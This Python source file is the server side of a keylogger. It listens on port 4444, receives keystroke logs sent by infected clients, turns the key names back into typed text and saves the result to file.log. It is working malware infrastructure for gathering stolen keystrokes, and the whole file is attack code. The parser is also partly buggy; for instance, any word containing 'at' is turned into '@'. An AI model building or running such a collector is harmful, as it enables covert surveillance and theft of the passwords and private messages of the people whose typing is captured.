#Socket that accepts and parses keylog file
#4/14/23

import socket
import os

def parse_string(file_content):
    newString = ""
    for word in file_content.split():
        newString += word
        if "BackSpace" in word:
            newString = newString[:-10]
        if "P_Enter" in word:
            newString = newString[:-7]
            newString += ' '
        if "space" in word:
            newString = newString[:-5]
            newString += ' '
        if "period" in word:
            newString = newString[:-6]
            newString += '.'
        if "Return" in word:
            newString = newString[:-6]
            newString += '\n'
        if "Shift_L" in word:
            newString = newString[:-7]

        if "exclam" in word:
            newString = newString[:-6]
            newString += '!'
        if "at" in word:
            newString = newString[:-2]
            newString += '@'
        if "numbersign" in word:
            newString = newString[:-10]
            newString += '#'
        if "dollar" in word:
            newString = newString[:-6]
            newString += '$'
        if "percent" in word:
            newString = newString[:-7]
            newString += '%'
        if "asciicircum" in word:
            newString = newString[:-11]
            newString += '^'
        if "ampersand" in word:
            newString = newString[:-9]
            newString += '&'
        if "asterisk" in word:
            newString = newString[:-8]
            newString += '*'
        if "parenleft" in word:
            newString = newString[:-9]
            newString += '('
        if "parenright" in word:
            newString = newString[:-10]
            newString += ')'
    return newString

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444

#recieve 4096 bytes each time
BUFFER_SIZE = 4096

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT}")
while(1):

    client_socket, address = s.accept()

    print(f"[+] {address} is connected.")

    #recieve file info
    #recieve using client socket, not server socket
    #recieved = client_socket.recv(BUFFER_SIZE).decode()
    #filename = recieved
    #remove abs path
    #filename = os.path.basename(filename)

    filename = "file.log"

    #recieve file from the socket

    with open(filename, "w") as f:
        while True:
            #read 1024 bytes fromt he socket
            bytes_read = client_socket.recv(BUFFER_SIZE)
            #bytes_read.replace('\n', ' ')
            string_read = bytes_read.decode('utf-8')
            
            #for line in string_read.splitlines():
                #print(line)
                #if line == 'space':
                    #print("SPACE IS TRUE")

            string_read = string_read.replace('\n', ' ')
            fstring_read = string_read.replace('Space', '')
            #string_read = string_read.replace('P_Enter', '')
            #string_read = string_read.replace('space', '')


            print(f"{string_read}")
            if not bytes_read:
                #nothing recieved file transmiting is done
                break
            #write to file the bytes we recieve
            file_content = parse_string(string_read)
            f.write(file_content)


client_socket.close()
